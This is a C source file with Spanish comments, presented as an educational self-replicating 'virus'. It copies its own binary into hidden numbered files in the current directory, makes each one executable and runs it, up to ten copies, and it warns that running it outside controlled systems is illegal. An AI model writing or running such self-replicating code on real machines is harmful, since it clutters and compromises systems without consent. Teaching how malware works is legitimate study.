/**
 * @file vc0002.c
 * @brief Implementación de virus autorreplicante con archivos ocultos
 *
 * Este programa implementa un virus autorreplicante que se copia a sí mismo
 * en el directorio actual, generando archivos ocultos.
 * Se generan hasta un máximo de 10 copias numeradas secuencialmente con el
 * prefijo ".VIRUS_NAME".
 *
 * Funcionamiento:
 *     - Verifica cuántas copias del virus existen en el directorio actual.
 *     - Si no ha alcanzado el límite definido en MAX_COPIAS, crea una nueva copia oculta de sí mismo.
 *     - Asigna permisos de ejecución a la nueva copia.
 *     - Ejecuta la nueva copia del programa.
 *     - Si se ha alcanzado el límite, detiene la replicación.
 *
 * Advertencia:
 *     - Este código es solo con fines educativos y no debe ejecutarse en sistemas no controlados.
 *     - La ejecución de código malicioso sin consentimiento es ilegal y antiético.
 *
 * Compilación: gcc -o vc0002 vc0002.c
 * Ejecución: ./vc0001
 *
 * @author Germán Riveros S.
 * @date 17/04/2025
 * @version 1.1
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>

#define VIRUS_NAME "vc0002"
#define EXTENSION ".out"
#define MAX_COPIAS 10

/**
 * @brief Cuenta el número de copias del virus en el directorio actual
 *
 * Esta función examina el directorio actual y cuenta cuántas copias del virus
 * existen basándose en el patrón de nombre definido.
 *
 * @return int El número de copias encontradas
 */

int contar_copias()
{
    int contador = 0;
    struct dirent *entrada;
    DIR *directorio = opendir(".");

    if (directorio == NULL)
    {
        perror("Error al abrir el directorio");
        return 0;
    }

    // Patrón que deben cumplir los archivos: .VIRUS_NAME_*EXTENSION
    char patron_inicio[20];
    snprintf(patron_inicio, sizeof(patron_inicio), ".%s", VIRUS_NAME);

    while ((entrada = readdir(directorio)) != NULL)
    {
        // Verifica si el nombre comienza con ".VIRUS_NAME" y termina con EXTENSION
        if (strncmp(entrada->d_name, patron_inicio, strlen(patron_inicio)) == 0 &&
            strstr(entrada->d_name, EXTENSION) != NULL)
        {
            contador++;
        }
    }

    closedir(directorio);
    return contador;
}

/**
 * @brief Función principal que ejecuta el proceso de replicación
 *
 * Verifica si se ha alcanzado el límite de copias y, en caso negativo,
 * crea una nueva copia oculta del virus, le asigna permisos de ejecución
 * y la ejecuta.
 *
 * @param argc Número de argumentos
 * @param argv Array de argumentos
 * @return int Código de retorno (0 para éxito, 1 para error)
 */

int main(int argc, char *argv[])
{
    if (argc < 1)
    {
        fprintf(stderr, "Error: no se pudo obtener el nombre del ejecutable.\n");
        return 1;
    }

    int num_copias = contar_copias();

    if (num_copias < MAX_COPIAS)
    {
        // Nombre del nuevo archivo oculto: .VIRUS_NAME_numeroEXTENSION
        char nuevo_nombre[50];
        snprintf(nuevo_nombre, sizeof(nuevo_nombre), ".%s_%d%s", VIRUS_NAME, num_copias + 1, EXTENSION);

        // Comando para copiar el ejecutable actual al nuevo nombre oculto
        char comando[150];
        snprintf(comando, sizeof(comando), "cp %s %s", argv[0], nuevo_nombre);
        if (system(comando) == -1)
        {
            perror("Error al copiar el archivo");
            return 1;
        }

        // Dar permisos de ejecución
        char chmod_comando[150];
        snprintf(chmod_comando, sizeof(chmod_comando), "chmod +x %s", nuevo_nombre);
        if (system(chmod_comando) == -1)
        {
            perror("Error al asignar permisos");
            return 1;
        }

        printf("Infectando... Creado %s\n", nuevo_nombre);

        // Ejecutar la nueva copia
        char ejecutar[150];
        snprintf(ejecutar, sizeof(ejecutar), "./%s", nuevo_nombre);
        if (system(ejecutar) == -1)
        {
            perror("Error al ejecutar la copia");
            return 1;
        }
    }
    else
    {
        printf("Límite de infección alcanzado (%d copias).\n", MAX_COPIAS);
    }

    return 0;
}